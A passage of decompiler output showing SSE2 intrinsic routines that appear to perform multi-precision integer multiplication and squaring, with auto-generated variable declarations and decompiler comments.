    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i * 2), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i * 2), 216);
    *(__m128i *)&v72[i + 5] = v4;
    *(__m128i *)&v72[i + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v75 + 1 * i) = v5;
    *(__m128i *)((char *)&v76 + 1 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__int128 *)((char *)&v78 + 1 * i) = (__int128)v6;
    *(__m128i *)((char *)&v79 + 1 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v79);
  v8 = _mm_mul_epu32(_mm_load_si128(&v73), v7);
  v9 = _mm_mul_epu32(v7, v77);
  si128 = _mm_load_si128(&stru_46C990);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  (__m128i)0i64,
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v72[39]), v77), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v80.m128i_i8[8]), v75), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v79.m128i_i8[8]), v76), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_418D23();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v80);
  v24 = _mm_mul_epu32(_mm_load_si128(&v73), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_46C990);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_418D60();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v80);
  v43 = _mm_mul_epu32(_mm_load_si128(&v74), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_46C990);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_418D9D((int)&v74, &v80);
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
  v58 = _mm_load_si128(&v81);
  v59 = _mm_mul_epu32(_mm_load_si128(&v74), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_46C990);
  v63 = _mm_and_si128(v62, v59);
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v57, v63), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v54 + 16) = _mm_cvtsi128_si32(v69);
  v71 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  *(_QWORD *)(v54 + 18) = v71.m128i_i64[0];
  *(_QWORD *)(v54 + 24) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v71, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v70, v67), 0x10u)).m128i_u64[0];
}
// 418E4F: variable 'v19' is possibly undefined
// 418E85: variable 'v25' is possibly undefined
// 418EB3: variable 'v33' is possibly undefined
// 418F22: variable 'v41' is possibly undefined
// 418F8E: variable 'v54' is possibly undefined
// 418FC3: variable 'v60' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;

//----- (00418D23) --------------------------------------------------------
int sub_418D23()
{
  return sub_418D60();
}
// 418D60: using guessed type int sub_418D60(void);

//----- (00418D60) --------------------------------------------------------
int sub_418D60()
{
  return sub_418D9D();
}
// 418D9D: using guessed type int sub_418D9D(void);

//----- (00418D9D) --------------------------------------------------------
__m128i __usercall sub_418D9D@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (0041904F) --------------------------------------------------------
int __cdecl sub_41904F(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm6
  __m128i v68; // xmm7
  __m128i v69; // xmm5
  __m128i v70; // xmm0
  __m128i v71; // xmm1
  __m128 v72; // xmm6
  __m128 v73; // xmm4
  __m128i v74; // xmm6
  int v75; // ecx
  __m128 v76; // xmm5
  __m128i v77; // xmm4
  __m128i v78; // xmm7
  __m128i v79; // xmm5
  __m128i v80; // xmm6
  __m128i v81; // xmm4
  __m128i v82; // xmm5
  int v83; // edx
  __m128i v84; // xmm7
  __m128i v85; // xmm3
  __m128i v86; // xmm1
  __m128i v87; // xmm3
  __m128i v88; // xmm2
  __m128i v89; // xmm6
  __m128i v90; // xmm7
  __m128i v91; // xmm6
  __m128i v92; // xmm7
  __m128i v93; // xmm5
  __m128i v94; // xmm0
  __m128i v95; // xmm1
  __m128 v96; // xmm6
  __m128 v97; // xmm4
  __m128i v98; // xmm6
  int v99; // ecx
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm7
  __m128i v111; // xmm6
  __m128i v112; // xmm7
  __m128i v113; // xmm5
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128 v116; // xmm6
  __m128 v117; // xmm4
  __m128i v118; // xmm6
  int v119; // ecx
  __m128 v120; // xmm5
  __m128i v121; // xmm4
  __m128i v122; // xmm7
  __m128i v123; // xmm5
  __m128i v124; // xmm6
  __m128i v125; // xmm4
  __m128i v126; // xmm5
  int v127; // edx
  __m128i v128; // xmm7
  __m128i v129; // xmm3
  __m128i v130; // xmm1
  __m128i v131; // xmm3
  __m128i v132; // xmm2
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm6
  __m128i v136; // xmm7
  __m128i v137; // xmm5
  __m128i v138; // xmm0
  __m128i v139; // xmm1
  __m128 v140; // xmm6
  __m128 v141; // xmm4
  __m128i v142; // xmm6
  int v143; // ecx
  __m128 v144; // xmm5
  __m128i v145; // xmm4
  __m128i v146; // xmm7
  __m128i v147; // xmm5
  __m128i v148; // xmm6
  __m128i v149; // xmm4
  __m128i v150; // xmm5
  __m128i *v151; // edx
  __m128i v152; // xmm7
  __m128i v153; // xmm6
  __m128i v154; // xmm7
  __m128i v155; // xmm6
  __m128i v156; // xmm7
  __m128i v157; // xmm5
  __m128i v158; // xmm0
  __m128i v159; // xmm1
  __m128 v160; // xmm6
  __m128 v161; // xmm4
  __m128i v162; // xmm6
  int v163; // ecx
  __m128 v164; // xmm5
  __m128i v165; // xmm4
  __m128i v166; // xmm7
  __m128i v167; // xmm5
  __m128i v168; // xmm6
  __m128i v169; // xmm4
  __m128i v170; // xmm5
  int v171; // edx
  __m128i v172; // xmm7
  __m128i v173; // xmm3
  __m128i v174; // xmm1
  __m128i v175; // xmm3
  __m128i v176; // xmm2
  __m128i v177; // xmm6
  __m128i v178; // xmm7
  __m128i v179; // xmm6
  __m128i v180; // xmm7
  __m128i v181; // xmm5
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128 v184; // xmm6
  __m128 v185; // xmm4
  __m128i v186; // xmm6
  int v187; // ecx
  __m128 v188; // xmm5
  __m128i v189; // xmm4
  __m128i v190; // xmm7
  __m128i v191; // xmm5
  __m128i v192; // xmm6
  __m128i v193; // xmm4
  __m128i v194; // xmm5
  __m128i *v195; // edx
  __m128i v196; // xmm7
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm6
  __m128i v200; // xmm7
  __m128i v201; // xmm5
  __m128i v202; // xmm0
  __m128i v203; // xmm1
  __m128 v204; // xmm6
  __m128 v205; // xmm4
  __m128i v206; // xmm6
  int v207; // ecx
  __m128 v208; // xmm5
  __m128i v209; // xmm4
  __m128i v210; // xmm7
  __m128i v211; // xmm5
  __m128i v212; // xmm6
  __m128i v213; // xmm4
  __m128i v214; // xmm5
  int v215; // edx
  __m128i v216; // xmm7
  __m128i v217; // xmm3
  __m128i v218; // xmm1
  __m128i v219; // xmm3
  __m128i v220; // xmm2
  __m128i v221; // xmm6
  __m128i v222; // xmm7
  __m128i v223; // xmm6
  __m128i v224; // xmm7
  __m128i v225; // xmm5
  __m128i v226; // xmm0
  __m128i v227; // xmm1
  __m128 v228; // xmm6
  __m128 v229; // xmm4
  __m128i v230; // xmm6
  int v231; // ecx
  __m128 v232; // xmm5
  __m128i v233; // xmm4
  __m128i v234; // xmm7
  __m128i v235; // xmm5
  __m128i v236; // xmm6
  __m128i v237; // xmm4
  __m128i v238; // xmm5
  __m128i *v239; // edx
  __m128i v240; // xmm7
  __m128i v241; // xmm6
  __m128i v242; // xmm7
  int result; // eax
  __m128i v244; // xmm6
  __m128i v245; // xmm7
  __m128i v246; // xmm5
  __m128i v247; // xmm0
  __m128i v248; // xmm1
  __m128 v249; // xmm6
  __m128 v250; // xmm4
  __m128i v251; // xmm6
  int v252; // ecx
  __m128 v253; // xmm5
  __m128i v254; // xmm4
  __m128i v255; // xmm7
  __m128i v256; // xmm5
  __m128i v257; // xmm6
  __m128i v258; // xmm4
  __m128i v259; // xmm5
  __m128i *v260; // edx
  __m128i v261; // xmm7
  __m128i v262; // xmm3
  __m128i v263; // xmm1
  __m128i v264; // xmm3
  __m128i v265; // xmm2
  __m128i v266; // xmm6
  __m128i v267; // xmm7
  __m128i v268; // xmm6
  __m128i v269; // xmm7
  __m128i v270; // xmm5
  __m128i v271; // xmm0
  __m128i v272; // xmm1
  __m128 v273; // xmm6
  __m128 v274; // xmm4
  __m128i v275; // xmm6
  __m128 v276; // xmm5
  __m128i v277; // xmm4
  __m128i v278; // xmm7
  __m128i v279; // xmm5
  __m128i v280; // xmm6
  __m128i v281; // xmm4
  __m128i v282; // xmm5
  __m128i v283; // xmm7
  __m128i v284; // xmm6
  __m128i v285; // xmm7
  __m128i v286; // xmm6
  __m128i v287; // xmm7
  __m128i v288; // xmm0
  __m128i v289; // xmm1
  __m128i v290; // xmm4
  __m128i v291; // xmm5
  __m128i v292; // xmm6
  __m128i v293; // xmm5
  __m128i v294; // xmm4
  __m128i v295; // xmm7
  __m128i v296; // xmm0
  __m128i v297; // xmm7
  __m128i v298; // xmm6
  __m128i v299; // xmm2
  __m128i v300; // xmm5
  __m128i v301; // xmm6
  __m128i v302; // xmm7
  __m128i v303; // xmm0
  __m128i v304; // xmm1
  __m128i v305; // xmm4
  __m128i v306; // xmm5
  __m128i v307; // xmm6
  __m128i v308; // [esp+0h] [ebp-11Ch] BYREF
  __m128i v309; // [esp+10h] [ebp-10Ch] BYREF
  __m128i v310; // [esp+20h] [ebp-FCh] BYREF
  __m128i v311; // [esp+30h] [ebp-ECh] BYREF
  __m128i v312; // [esp+40h] [ebp-DCh] BYREF
  __m128i v313; // [esp+50h] [ebp-CCh] BYREF
  __m128i v314; // [esp+60h] [ebp-BCh] BYREF
  __m128i v315; // [esp+70h] [ebp-ACh] BYREF
  __m128i v316; // [esp+80h] [ebp-9Ch] BYREF
  __m128i v317; // [esp+90h] [ebp-8Ch]
  __m128i v318[7]; // [esp+A0h] [ebp-7Ch]

  for ( i = 0; i != 64; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v309 + 2 * i) = v3;
    *(__m128i *)((char *)&v309 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v317 + 2 * i) = v4;
    v318[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v309);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_46C990);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v317);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v310);
  v20 = _mm_mul_epu32(_mm_load_si128(&v309), v19);
  v21 = _mm_load_si128(&stru_46C990);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v317);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v308)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v311);
  v38 = _mm_mul_epu32(_mm_load_si128(&v309), v37);
  v39 = _mm_load_si128(&stru_46C990);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v317);
  v43 = _mm_load_si128(&v310);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v310.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v308)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v311);
  v60 = _mm_mul_epu32(_mm_load_si128(&v310), v59);
  v61 = _mm_load_si128(&stru_46C990);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v318[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_419162((int)&v311, &v310);
  v67 = _mm_add_epi32(v65, v65);
  v68 = _mm_add_epi32(v66, v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v70 = _mm_move_epi64(v67);
  v71 = _mm_move_epi64(v68);
  v72 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v67, v70), v70), 4);
  v73 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v308)), (__m128i)v72);
  v74 = (__m128i)_mm_movehl_ps(v72, v73);
  *(_DWORD *)(v75 + 24) = _mm_cvtsi128_si32((__m128i)v73);
  v76 = (__m128)_mm_add_epi32(v69, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v76);
  v77 = _mm_add_epi64(_mm_srli_epi64((__m128i)v73, 0x10u), (__m128i)v76);
  *(_QWORD *)(v75 + 26) = v77.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v77, 0x30u), v74).m128i_u64[0];
  v78 = _mm_load_si128(&v312);
  v79 = _mm_mul_epu32(_mm_load_si128(&v310), v78);
  v80 = _mm_load_si128(&stru_46C990);
  v81 = _mm_and_si128(v80, v79);
  v82 = _mm_srli_epi32(v79, 0x10u);
  v84 = _mm_mul_epu32(v78, *(__m128i *)(v83 - 16));
  sub_419162((int)&v311, &v311);
  v85 = _mm_load_si128(&v311);
  v86 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v311.m128i_i8[8]), v85);
  v87 = _mm_mul_epu32(v85, v85);
  v88 = _mm_load_si128(&stru_46C990);
  v89 = _mm_add_epi32(_mm_and_si128(v80, v84), _mm_and_si128(v88, v86));
  v90 = _mm_add_epi32(_mm_srli_epi32(v84, 0x10u), _mm_srli_epi32(v86, 0x10u));
  v91 = _mm_add_epi32(v89, v89);
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v82, v82), _mm_srli_epi32(v87, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v94 = _mm_move_epi64(v91);
  v95 = _mm_move_epi64(v92);
  v96 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v91, v94), v94), 4);
  v97 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v81, v81), _mm_and_si128(v88, v87)), _mm_loadl_epi64(&v308)),
                  (__m128i)v96);
  v98 = (__m128i)_mm_movehl_ps(v96, v97);
  *(_DWORD *)(v99 + 32) = _mm_cvtsi128_si32((__m128i)v97);
  v100 = (__m128)_mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v97, 0x10u), (__m128i)v100);
  *(_QWORD *)(v99 + 34) = v101.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v98).m128i_u64[0];
  v102 = _mm_load_si128(&v312);
  v103 = _mm_mul_epu32(_mm_load_si128(&v311), v102);
  v104 = _mm_load_si128(&stru_46C990);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v108 = _mm_mul_epu32(v102, *v107);
  v109 = _mm_and_si128(v104, v108);
  v110 = _mm_srli_epi32(v108, 0x10u);
  sub_419125();
  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_add_epi32(v110, v110);
  v113 = _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v114 = _mm_move_epi64(v111);
  v115 = _mm_move_epi64(v112);
  v116 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v114), v114), 4);
  v117 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v308)), (__m128i)v116);
  v118 = (__m128i)_mm_movehl_ps(v116, v117);
  *(_DWORD *)(v119 + 40) = _mm_cvtsi128_si32((__m128i)v117);
  v120 = (__m128)_mm_add_epi32(v113, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v120);
  v121 = _mm_add_epi64(_mm_srli_epi64((__m128i)v117, 0x10u), (__m128i)v120);
  *(_QWORD *)(v119 + 42) = v121.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v121, 0x30u), v118).m128i_u64[0];
  v122 = _mm_load_si128(&v313);
  v123 = _mm_mul_epu32(_mm_load_si128(&v311), v122);
  v124 = _mm_load_si128(&stru_46C990);
  v125 = _mm_and_si128(v124, v123);
  v126 = _mm_srli_epi32(v123, 0x10u);
  v128 = _mm_mul_epu32(v122, *(__m128i *)(v127 - 16));
  sub_419125();
  v129 = _mm_load_si128(&v312);
  v130 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v312.m128i_i8[8]), v129);
  v131 = _mm_mul_epu32(v129, v129);
  v132 = _mm_load_si128(&stru_46C990);
  v133 = _mm_add_epi32(_mm_and_si128(v124, v128), _mm_and_si128(v132, v130));
  v134 = _mm_add_epi32(_mm_srli_epi32(v128, 0x10u), _mm_srli_epi32(v130, 0x10u));
  v135 = _mm_add_epi32(v133, v133);
  v136 = _mm_add_epi32(v134, v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v126, v126), _mm_srli_epi32(v131, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v138 = _mm_move_epi64(v135);
  v139 = _mm_move_epi64(v136);
  v140 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v135, v138), v138), 4);
  v141 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v125, v125), _mm_and_si128(v132, v131)),
                     _mm_loadl_epi64(&v308)),
                   (__m128i)v140);
  v142 = (__m128i)_mm_movehl_ps(v140, v141);
  *(_DWORD *)(v143 + 48) = _mm_cvtsi128_si32((__m128i)v141);
  v144 = (__m128)_mm_add_epi32(v137, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v136, v139), v139), 4));
  _mm_storeh_ps((double *)&v308.m128i_i64[1], v144);
  v145 = _mm_add_epi64(_mm_srli_epi64((__m128i)v141, 0x10u), (__m128i)v144);
  *(_QWORD *)(v143 + 50) = v145.m128i_i64[0];
  v308.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v145, 0x30u), v142).m128i_u64[0];
  v146 = _mm_load_si128(&v313);
  v147 = _mm_mul_epu32(_mm_load_si128(&v312), v146);
  v148 = _mm_load_si128(&stru_46C990);
  v149 = _mm_and_si128(v148, v147);
  v150 = _mm_srli_epi32(v147, 0x10u);
  v152 = _mm_mul_epu32(v146, *v151);
  v153 = _mm_and_si128(v148, v152);
  v154 = _mm_srli_epi32(v152, 0x10u);
  sub_4190E8();
  v155 = _mm_add_epi32(v153, v153);
  v156 = _mm_add_epi32(v154, v154);
  v157 = _mm_add_epi32(_mm_add_epi32(v150, v150), _mm_loadl_epi64((const __m128i *)&v308.m128i_i8[8]));
  v158 = _mm_move_epi64(v155);
  v159 = _mm_move_epi64(v156);
  v160 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v155, v158), v158), 4);
